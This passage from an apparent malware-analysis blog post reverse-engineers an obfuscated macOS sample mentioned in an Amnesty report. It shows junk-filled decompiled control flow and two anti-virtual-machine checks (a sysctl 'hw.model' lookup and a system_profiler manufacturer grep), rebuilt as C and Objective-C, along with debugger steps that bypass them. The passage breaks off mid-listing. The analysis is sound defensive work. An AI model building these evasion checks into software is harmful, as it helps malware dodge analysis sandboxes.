</span></span><span class=line><span class=cl>  <span class=n>v41</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v42</span> <span class=o>=</span> <span class=n>v9</span><span class=p>;</span>
</span></span></code></pre></div><p>Just visually we can see that the do while blocks are pretty weird and the checks don&rsquo;t seem useful at all. The biggest issue of this obfuscation is that to step and debug the control flow is annoying and takes time.</p><p>We can step every instruction in the debugger, which can be slow (although just the first time since then we can set breakpoints for next sessions). To trace the code paths we can use tools such as <a href=https://software.intel.com/content/www/us/en/develop/articles/pin-a-dynamic-binary-instrumentation-tool.html>PIN</a> and <a href=https://github.com/gaasedelen/lighthouse>Lighthouse</a>. All the bogus flow would still be traced and flagged but we could visualise which areas were executed and which weren&rsquo;t.</p><p>But there is no need to bring bazookas to a knife fight. Instead I simplified and just used bruteforce. I always like to look around the code to have a general feeling before deep diving into it (I&rsquo;m a fan of +ORC zen cracking thing). So I saw the code basic blocks and could see the string references to virtual machine detection tricks described by Amnesty report. Instead of tracing the control flow I could just gather all those basic blocks and breakpoint all of them and hope for the best. Using the first anti-vm detection as an example:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:100001B45 loc_100001B45:                     ; CODE XREF: _main+1B9âj
</span></span><span class=line><span class=cl>__text:100001B45    cmp     eax, 4BB9C77Ch
</span></span><span class=line><span class=cl>__text:100001B4A    jnz     loc_100001891
</span></span><span class=line><span class=cl>__text:100001B50    xor     esi, esi                ; void *
</span></span><span class=line><span class=cl>__text:100001B52    xor     ecx, ecx                ; void *
</span></span><span class=line><span class=cl>__text:100001B54    xor     r8d, r8d                ; size_t
</span></span><span class=line><span class=cl>__text:100001B57    lea     rbx, aHwModel           ; &#34;hw.model&#34;
</span></span><span class=line><span class=cl>__text:100001B5E    mov     rdi, rbx                ; char *
</span></span><span class=line><span class=cl>__text:100001B61    lea     r15, [rbp+__size]
</span></span><span class=line><span class=cl>__text:100001B68    mov     rdx, r15                ; size_t *
</span></span><span class=line><span class=cl>__text:100001B6B    call    _sysctlbyname           ; size_t len = 0;
</span></span></code></pre></div></div></div><br><p>The first two instructions of this block are junk, so we can set the breakpoint at address <code>0x100001B50</code>. When this check is finally going to be executed the debugger will breakpoint and we avoided tracing through all the bogus control flow. The only problem is to automate the breakpoint addresses for the basic blocks we are interested in. I just did it by hand since there weren&rsquo;t that many candidates.</p><p>Nevertheless as I mentioned before, the decompiler makes this even easier. I&rsquo;m still not a frequent user of the decompiler (wrongly so) and that&rsquo;s the reason why I attacked this issue with the breakpoint bruteforce method. Later on I used the decompiler and this makes it so much easier to find where the interesting code is. The following listing shows the full obfuscation in <code>executeTrampoline</code> Objective-C method:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__cdecl</span> <span class=o>-</span><span class=p>[</span><span class=n>appAppDelegate</span> <span class=n>executeTrampoline</span><span class=p>](</span><span class=n>appAppDelegate</span> <span class=o>*</span><span class=n>self</span><span class=p>,</span> <span class=n>SEL</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>id</span> <span class=o>*</span><span class=n>v4</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-38h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bool</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [rsp+16h] [rbp-2Ah]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bool</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [rsp+17h] [rbp-29h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1314525355</span><span class=p>;</span> <span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>860919120</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                      <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                          <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                              <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                    <span class=k>while</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=mi>1906374694</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                      <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>378289692</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                      <span class=k>if</span> <span class=p>(</span> <span class=n>v5</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                                        <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>166979571</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                                    <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>1362875871</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                                      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                    <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>653958391</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                    <span class=k>if</span> <span class=p>(</span> <span class=n>v6</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                                      <span class=n>i</span> <span class=o>=</span> <span class=mi>349463466</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                                  <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1680978437</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                                    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                  <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1260767775</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                <span class=p>}</span>
</span></span><span class=line><span class=cl>                                <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1490852160</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                                  <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>842796370</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                              <span class=p>}</span>
</span></span><span class=line><span class=cl>                              <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1260767776</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                              <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>506855829</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>                            <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1178212413</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                              <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=n>v6</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=nf>objc_msgSend</span><span class=p>(</span><span class=o>*</span><span class=n>v4</span><span class=p>,</span> <span class=s>&#34;launchNewStyle&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=n>i</span> <span class=o>=</span> <span class=mi>1362875872</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                          <span class=p>}</span>
</span></span><span class=line><span class=cl>                          <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>428753874</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                          <span class=n>i</span> <span class=o>=</span> <span class=mi>376588111</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>376588110</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                          <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=nf>objc_msgSend</span><span class=p>(</span><span class=o>*</span><span class=n>v4</span><span class=p>,</span> <span class=s>&#34;launchOldStyle&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>653958391</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                      <span class=p>}</span>
</span></span><span class=line><span class=cl>                      <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>349463465</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                      <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1680978436</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1167397111</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nl>LABEL_30</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>i</span> <span class=o>=</span> <span class=mi>161326308</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                  <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>860919121</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                  <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1946496017</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=o>-</span><span class=mi>842796371</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nf>objc_msgSend</span><span class=p>(</span><span class=o>*</span><span class=n>v4</span><span class=p>,</span> <span class=s>&#34;launchOldStyle&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                  <span class=k>goto</span> <span class=n>LABEL_30</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>653958392</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                  <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>i</span> <span class=o>=</span> <span class=mi>428753875</span><span class=p>;</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>506855830</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>              <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>434592465</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>434592466</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>v4</span> <span class=o>=</span> <span class=p>(</span><span class=n>id</span> <span class=o>*</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>v3</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v3</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span><span class=p>)</span><span class=n>self</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>v5</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=nf>objc_msgSend</span><span class=p>(</span><span class=o>*</span><span class=n>v4</span><span class=p>,</span> <span class=s>&#34;isAfterPatch&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>=</span> <span class=mi>1906374695</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>378289693</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1178212412</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>166979572</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>=</span> <span class=mi>163091173</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>166979571</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1167397110</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>i</span> <span class=o>!=</span> <span class=mi>163091173</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>What we can clearly see in this code is that we are just interested in all the <code>objc_msgSend</code> calls, while the rest of the code is just junk. To debug this function we just need to breakpoint those basic blocks and wait for the debugger to hit them, bypassing all the junk code. This should be possible to automate so we can pass this information from the disassembler to the debugger and make the whole process faster.</p><p>After breakpointing the interesting basic blocks I finally reached to the first virtual machine detection attempt. The code queries the hardware model via <code>sysctl</code> and then tries to match known virtualization software. It&rsquo;s a variation of this sample code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/sysctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nf>sysctlbyname</span><span class=p>(</span><span class=s>&#34;hw.model&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>len</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>len</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>model</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>len</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>char</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>sysctlbyname</span><span class=p>(</span><span class=s>&#34;hw.model&#34;</span><span class=p>,</span> <span class=n>model</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>len</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>model</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>model</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>I use VMware Fusion so my model will be <code>VMware7,1</code>. Then the code checks if the model string starts with <code>vmware</code>, <code>parallels</code>, or <code>virtualbox</code>. To bypass this check we can simply modify the model value to something else that doesn&rsquo;t match those strings such as <code>MacOS7,1</code> or just modify the first byte.</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:100001B6B    call    _sysctlbyname   ; find out the size of model string
</span></span><span class=line><span class=cl>__text:100001B70    mov     rdi, [rbp+__size]
</span></span><span class=line><span class=cl>__text:100001B77    call    _malloc         ; allocate space for char *model
</span></span><span class=line><span class=cl>__text:100001B7C    mov     r14, rax        ; we want this address so we can modify later on
</span></span><span class=line><span class=cl>__text:100001B7F    xor     ecx, ecx        
</span></span><span class=line><span class=cl>__text:100001B81    xor     r8d, r8d        
</span></span><span class=line><span class=cl>__text:100001B84    mov     rdi, rbx        
</span></span><span class=line><span class=cl>__text:100001B87    mov     rsi, r14        ; the model buffer
</span></span><span class=line><span class=cl>__text:100001B8A    mov     rdx, r15        
</span></span><span class=line><span class=cl>__text:100001B8D    call    _sysctlbyname   ; just change the buffer content after the call
</span></span><span class=line><span class=cl>__text:100001B92    mov     rdi, cs:classRef_NSString
</span></span></code></pre></div></div></div><br><p>In this case we need to set a breakpoint at address <code>0x100001B7C</code> or <code>0x100001B87</code> so we know the address of the buffer. Then we set another breakpoint after the second call to <code>sysctlbyname</code> at address <code>0x100001B92</code>. There we modify the buffer contents and bypass the first virtual machine detection. This could also be automated with a kernel extension or hooking <code>sysctlbyname</code>.</p><p>There is a second virtual machine detection attempt, this one described in Amnesty report. It uses the <code>system_profiler</code> system command to find the hardware manufacturer. Executing the command on a virtual machine:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>system_profiler</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ system_profiler SPUSBDataType <span class=p>|</span> egrep -i <span class=s2>&#34;Manufacturer: (parallels|vmware|virtualbox)&#34;</span>
</span></span><span class=line><span class=cl>          Manufacturer: VMware, Inc.
</span></span><span class=line><span class=cl>              Manufacturer: VMware
</span></span><span class=line><span class=cl>              Manufacturer: VMware
</span></span><span class=line><span class=cl>          Manufacturer: VMware
</span></span></code></pre></div></div></div><br><p>This is the detection code decompilation output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>v26</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span><span class=o>&amp;</span><span class=n>OBJC_CLASS___NSTask</span><span class=p>,</span> <span class=s>&#34;alloc&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>v37</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v26</span><span class=p>,</span> <span class=s>&#34;init&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v37</span><span class=p>,</span> <span class=s>&#34;setLaunchPath:&#34;</span><span class=p>,</span> <span class=nf>CFSTR</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=n>v27</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>OBJC_CLASS___NSString</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;stringWithFormat:&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nf>CFSTR</span><span class=p>(</span><span class=s>&#34;%@&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=nf>CFSTR</span><span class=p>(</span><span class=s>&#34;system_profiler SPUSBDataType | egrep -i </span><span class=se>\&#34;</span><span class=s>Manufacturer: (parallels|vmware|virtualbox)</span><span class=se>\&#34;</span><span class=s>&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=n>v28</span> <span class=o>=</span> <span class=nf>objc_retainAutoreleasedReturnValue</span><span class=p>(</span><span class=n>v27</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>v29</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span><span class=o>&amp;</span><span class=n>OBJC_CLASS___NSArray</span><span class=p>,</span> <span class=s>&#34;arrayWithObjects:&#34;</span><span class=p>,</span> <span class=nf>CFSTR</span><span class=p>(</span><span class=s>&#34;-c&#34;</span><span class=p>),</span> <span class=n>v28</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>v36</span> <span class=o>=</span> <span class=nf>objc_retainAutoreleasedReturnValue</span><span class=p>(</span><span class=n>v29</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>objc_release</span><span class=p>(</span><span class=n>v28</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v37</span><span class=p>,</span> <span class=s>&#34;setArguments:&#34;</span><span class=p>,</span> <span class=n>v36</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>v30</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span><span class=o>&amp;</span><span class=n>OBJC_CLASS___NSPipe</span><span class=p>,</span> <span class=s>&#34;pipe&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>v35</span> <span class=o>=</span> <span class=nf>objc_retainAutoreleasedReturnValue</span><span class=p>(</span><span class=n>v30</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v37</span><span class=p>,</span> <span class=s>&#34;setStandardOutput:&#34;</span><span class=p>,</span> <span class=n>v35</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>v31</span> <span class=o>=</span> <span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v35</span><span class=p>,</span> <span class=s>&#34;fileHandleForReading&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>v38</span> <span class=o>=</span> <span class=nf>objc_retainAutoreleasedReturnValue</span><span class=p>(</span><span class=n>v31</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v37</span><span class=p>,</span> <span class=s>&#34;launch&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v37</span><span class=p>,</span> <span class=s>&#34;waitUntilExit&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>LOBYTE</span><span class=p>(</span><span class=n>v54</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>objc_msgSend</span><span class=p>(</span><span class=n>v37</span><span class=p>,</span> <span class=s>&#34;terminationStatus&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span></code></pre></div><p>Translated to Objective-C:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>NSTask</span> <span class=o>*</span><span class=n>task</span> <span class=o>=</span> <span class=p>[[</span><span class=n>NSTask</span> <span class=n>alloc</span><span class=p>]</span> <span class=n>init</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=nl>setLaunchPath</span><span class=p>:</span><span class=err>@</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NSString</span> <span class=o>*</span><span class=n>cmd</span> <span class=o>=</span> <span class=p>[</span><span class=n>NSString</span> <span class=nl>stringWithFormat</span><span class=p>:</span><span class=s>&#34;%@&#34;</span><span class=p>,</span> <span class=err>@</span><span class=s>&#34;system_profiler SPUSBDataType | egrep -i </span><span class=se>\&#34;</span><span class=s>Manufacturer: (parallels|vmware|virtualbox)</span><span class=se>\&#34;</span><span class=s>&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>NSArray</span> <span class=o>*</span><span class=n>args</span> <span class=o>=</span> <span class=p>[</span><span class=n>NSArray</span> <span class=nl>arrayWithObjects</span><span class=p>:</span> <span class=err>@</span><span class=s>&#34;-c&#34;</span><span class=p>,</span> <span class=n>cmd</span><span class=p>,</span> <span class=n>nil</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=nl>setArguments</span><span class=p>:</span><span class=n>args</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NSPipe</span> <span class=o>*</span><span class=n>pipe</span> <span class=o>=</span> <span class=p>[</span><span class=n>NSPipe</span> <span class=n>pipe</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=nl>setStandardOutput</span><span class=p>:</span><span class=n>pipe</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>NSFileHandle</span> <span class=o>*</span><span class=n>file</span> <span class=o>=</span> <span class=p>[</span><span class=n>pipe</span> <span class=n>fileHandleForReading</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>task</span> <span class=n>launch</span><span class=p>];</span>
